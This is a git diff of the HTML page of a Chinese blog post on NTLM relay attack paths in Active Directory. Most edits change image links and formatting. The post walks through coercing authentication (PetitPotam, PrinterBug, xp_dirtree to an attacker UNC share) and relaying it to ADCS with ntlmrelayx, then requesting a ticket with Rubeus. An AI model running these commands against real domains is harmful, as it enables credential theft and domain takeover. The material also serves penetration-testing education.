@@ -6,12 +6,14 @@
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>NTLM Relay - 柠檬k</title><meta name="Description" content="Personal Blog"><meta property="og:title" content="NTLM Relay" />
-<meta property="og:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+<meta property="og:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：
+The NTLM Authentication Protocol and Security Support Provider
 NTLM 篇 - windows protocol
 NTLM Relay - hackndo
 本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 &#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
+原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
 触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
  MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
@@ -19,8 +21,7 @@ MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
 PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
  Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
 强制身份验证通过 SMB 进行。
-上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
- ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。" />
+上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://songzhiv.github.io/ntlm-relay/" /><meta property="og:image" content="https://songzhiv.github.io/static/favicon.ico"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-02-18T17:10:15+08:00" />
@@ -30,12 +31,14 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <meta name="twitter:image" content="https://songzhiv.github.io/static/favicon.ico"/>
 
 <meta name="twitter:title" content="NTLM Relay"/>
-<meta name="twitter:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+<meta name="twitter:description" content="本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：
+The NTLM Authentication Protocol and Security Support Provider
 NTLM 篇 - windows protocol
 NTLM Relay - hackndo
 本篇主要围绕下图进行。来自
 https://www.thehacker.recipes/ad/movement/ntlm/relayNTLM relay.drawio.png
 &#34; https://www.thehacker.recipes/ad/movement/ntlm/relay 
+原理直接看国外老哥写的这篇文章NTLM RELAY。本文主要讲Relay的一些路径。
 触发NTLM认证。 SMB PetitPotam（MS-EFSR） https://github.com/topotam/PetitPotam
  MS-EFSR 是 Microsoft 的加密文件系统远程协议。它对远程存储并通过网络访问的加密数据执行维护和管理操作，并可作为 RPC 接口使用。该接口可通过 \pipe\efsrpc、\pipe\lsarpc、\pipe\samr、\pipe\lsass 和 \pipe\netlogon SMB 命名管道使用。
 MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
@@ -43,8 +46,7 @@ MS-efs触发机器账户强制返回身份验证。默认走SMB协议。
 PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
  Microsoft 的 Print Spooler 是一项处理打印作业和其他与打印相关的各种任务的服务。控制域用户/计算机的攻击者可以通过特定的 RPC 调用触发运行它的目标的假脱机服务，并使其对攻击者选择的目标进行身份验证。此缺陷是“无法修复”，默认情况下在所有 Windows 环境中启用。
 强制身份验证通过 SMB 进行。
-上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。
- ShadowCoerce (MS-FSRVP)  MS-FSRVP 是 Microsoft 的文件服务器远程 VSS 协议。它用于在远程计算机上创建文件共享的卷影副本，并促进备份应用程序在 SMB2 共享 上执行应用程序一致的备份和数据恢复。"/>
+上面提到的“具体调用”就是 RpcRemoteFindFirstPrinterChangeNotificationEx 通知方法，它是 MS-RPRN 协议的一部分。 MS-RPRN 是 Microsoft 的打印系统远程协议。它定义了打印客户端和打印服务器之间的打印作业处理和打印系统管理的通信。"/>
 <meta name="application-name" content="柠檬k">
 <meta name="apple-mobile-web-app-title" content="柠檬k"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -61,7 +63,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/ntlm-relay\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  421 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  435 ,
         "url": "https:\/\/songzhiv.github.io\/ntlm-relay\/","datePublished": "2022-02-18T17:10:15+08:00","dateModified": "2022-02-18T17:10:15+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -138,8 +140,8 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">NTLM Relay</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ad%E5%9F%9F/"><i class="far fa-folder fa-fw"></i>AD域</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 421 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 435 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -179,7 +181,7 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
         <li><a href="#adcs-esc8">ADCS ESC8</a></li>
         <li><a href="#cred-dump">Cred Dump</a></li>
         <li><a href="#exec">EXEC</a></li>
-        <li><a href="#枚举域内信息">枚举域内信息</a></li>
+        <li><a href="#枚举信息">枚举信息</a></li>
         <li><a href="#创建用户ldaps">创建用户（LDAPS）</a></li>
         <li><a href="#exchange">Exchange</a></li>
         <li><a href="#影子凭证shadow-credentials">影子凭证（Shadow Credentials）</a></li>
@@ -189,20 +191,22 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
     <li><a href="#参考">参考</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：</p>
+            </div><div class="content" id="content"><p><strong>本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读以下世纪好文：</strong></p>
+<p><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener noreffer">The NTLM Authentication Protocol and Security Support Provider</a></p>
 <p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian" target="_blank" rel="noopener noreffer">NTLM 篇 - windows protocol</a></p>
 <p><a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM Relay - hackndo</a></p>
-<p>本篇主要围绕下图进行。<a href="https://www.thehacker.recipes/ad/movement/ntlm/relay" target="_blank" rel="noopener noreffer">来自</a></p>
-<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" title="NTLM relay.drawio.png" data-thumbnail="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" data-sub-html="<h2>https://www.thehacker.recipes/ad/movement/ntlm/relay</h2><p>NTLM relay.drawio.png</p>">
+<p>本篇主要围绕下图进行。<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">来自</a></p>
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png" title="NTLM relay.drawio.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png" data-sub-html="<h2>https://www.thehacker.recipes/ad/movement/ntlm/relay</h2><p>NTLM relay.drawio.png</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png"
-            data-srcset="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png, https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png 1.5x, https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png 2x"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png 2x"
             data-sizes="auto"
-            alt="https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png" />
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png" />
     </a><figcaption class="image-caption">https://www.thehacker.recipes/ad/movement/ntlm/relay</figcaption>
     </figure></p>
+<p>原理直接看国外老哥写的这篇文章<a href="https://en.hackndo.com/ntlm-relay/" target="_blank" rel="noopener noreffer">NTLM RELAY</a>。本文主要讲Relay的一些路径。</p>
 <h2 id="触发ntlm认证">触发NTLM认证。</h2>
 <h3 id="smb">SMB</h3>
 <h4 id="petitpotamms-efsr">PetitPotam（MS-EFSR）</h4>
@@ -215,10 +219,10 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png"
-        data-srcset="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png, https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png 1.5x, https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/BZsARCKxMv2Yyk9.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png"
         title="image.png" /></p>
 <h4 id="printerbugms-rprn">PrinterBug（MS-RPRN）</h4>
 <p><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py" target="_blank" rel="noopener noreffer">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>
@@ -235,10 +239,10 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png"
-        data-srcset="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png, https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png 1.5x, https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/KcrGQFks5bU7SPo.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217172953-wkxtvu0.png"
         title="image.png" /></p>
 <p><a href="https://github.com/ShutdownRepo/ShadowCoerce" target="_blank" rel="noopener noreffer">https://github.com/ShutdownRepo/ShadowCoerce</a></p>
 <div class="highlight"><div class="chroma">
@@ -253,18 +257,20 @@ PrinterBug（MS-RPRN） https://github.com/dirkjanm/krbrelayx/blob/master/printe
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">exec</span> master.dbo.xp_dirtree <span class="s1">&#39;\\10.10.10.123\test&#39;</span>
+
 </code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png"
-        data-srcset="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png, https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png 1.5x, https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/4ZT1lmLFtYBGv3N.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220216172606-1f7ugw9.png"
         title="image.png" /></p>
 <p>目标机器安装webclient时，可通过指定端口触发http类型认证。</p>
 <div class="highlight"><div class="chroma">
@@ -288,10 +294,10 @@ xp_dirtree <span class="s1">&#39;\\hostname@1234\test&#39;</span> --http
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png"
-        data-srcset="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png, https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png 1.5x, https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/X8rQ1pVmhKHkJCj.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217174751-z98aqxm.png"
         title="image.png" /></p>
 <h3 id="http">HTTP</h3>
 <h4 id="webdav">WEBDAV</h4>
@@ -312,10 +318,10 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png"
-        data-srcset="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png, https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png 1.5x, https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/zxg8cJ7UQbSr3TV.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211203153907-ba1w2rr.png"
         title="image.png" /></p>
 <p>还有A-TEAM大哥们提到的WEBDAV XXE</p>
 <p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe" target="_blank" rel="noopener noreffer">https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#41-webdav-xxe</a></p>
@@ -335,10 +341,10 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png"
-        data-srcset="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png, https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png 1.5x, https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/Jbx9W1wTqvKHBoF.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png"
         title="image.png" /></p>
 <h4 id="邮件钓鱼">邮件钓鱼</h4>
 <p>outlook与foxmail 图片预览功能支持HTTP和UNC路径，可触发SMB和http类型认证。</p>
@@ -346,19 +352,19 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png"
-        data-srcset="https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png, https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png 1.5x, https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/rmQYGvTsH54neNP.png"
-        title="image-20220219125011221" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124509-c70vna4.png"
+        title="image.png" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png"
-        data-srcset="https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png, https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png 1.5x, https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/1BDOyZ5rinPSUXm.png"
-        title="image-20220219125106389" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219124644-68e0j3a.png"
+        title="image.png" /></p>
 <h4 id="xxe与ssrf">XXE与SSRF</h4>
 <p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf" target="_blank" rel="noopener noreffer">https://daiker.gitbook.io/windows-protocol/ntlm-pian/5#0x0a-xxe-and-and-ssrf</a></p>
 <blockquote>
@@ -383,29 +389,29 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png"
-        data-srcset="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png, https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png 1.5x, https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/Zq3HX1DJyF85krf.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210162244-k7o78qe.png"
         title="image.png" /></p>
 <h3 id="smb-1">SMB</h3>
 <p>域控：作为server端，域控默认是强制SMB签名的。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png"
-        data-srcset="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png, https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png 1.5x, https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/JO6w24zBN9PV3Ls.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160625-uh5gccn.png"
         title="image.png" /></p>
 <p>域内普通机器：作为客户端，默认不开强制签名，默认为Enabled。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png"
-        data-srcset="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png, https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png 1.5x, https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/UbJIV7Dd3h8ZS9a.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220210160938-g8l0lfw.png"
         title="image.png" /></p>
 <h2 id="relay-to">Relay To？</h2>
 <p><strong>ADC.com</strong></p>
@@ -433,56 +439,86 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 </code></pre></td></tr></table>
 </div>
 </div><p>利用</p>
-<p>python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support &ndash;adcs &ndash;template DomainController</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t http://10.10.10.14/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png"
-        data-srcset="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png, https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png 1.5x, https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/5fFdVhPJnBSgzRC.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215111530-1sxziik.png"
         title="image.png" /></p>
-<p>Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:<code>base64cert</code> /domain:adc.com /dc:10.10.10.10 /ptt</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:base64cert /domain:adc.com /dc:10.10.10.10 /ptt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png"
-        data-srcset="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png, https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png 1.5x, https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png 2x"
